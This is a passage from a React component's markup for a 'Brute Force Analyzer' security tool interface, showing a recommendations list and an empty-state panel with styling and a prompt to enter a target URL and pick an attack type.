                    className="flex items-start gap-3 px-3 py-3 rounded border border-[oklch(0.22_0.03_220)] bg-[oklch(0.12_0.01_240)] hover:border-[oklch(0.30_0.06_220)] transition-colors"
                  >
                    <div className="flex flex-col items-start gap-1 flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-mono text-xs font-semibold text-foreground">
                          {rec.label}
                        </span>
                        <PriorityBadge level={rec.priority} />
                      </div>
                      <p className="font-mono text-xs text-muted-foreground leading-relaxed">
                        {rec.desc}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Empty state */}
      <AnimatePresence>
        {!analyzed && (
          <motion.div
            data-ocid="bruteforce.empty_state"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="cyber-card rounded-lg p-12 flex flex-col items-center justify-center text-center"
            style={{ borderColor: "oklch(0.35 0.10 25 / 0.4)" }}
          >
            <div className="relative mb-6">
              <div className="w-20 h-20 rounded-full bg-[oklch(0.13_0.03_25)] border border-[oklch(0.38_0.14_25)] flex items-center justify-center">
                <KeyRound className="w-10 h-10 text-[oklch(0.55_0.14_25)]" />
              </div>
              <div className="absolute -top-1 -right-1 w-5 h-5 rounded-full bg-[oklch(0.15_0.03_25)] border border-[oklch(0.42_0.14_25)] flex items-center justify-center">
                <span className="blink text-[oklch(0.75_0.22_25)] text-[8px] font-mono">
                  ●
                </span>
              </div>
            </div>
            <h3 className="font-mono text-base font-semibold text-foreground mb-2">
              Brute Force Analyzer Ready
            </h3>
            <p className="font-mono text-sm text-muted-foreground max-w-md">
              Enter a target URL and select an attack type, or use the presets
              to generate brute-force attack profiles, payload formats, and
              defensive recommendations.
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
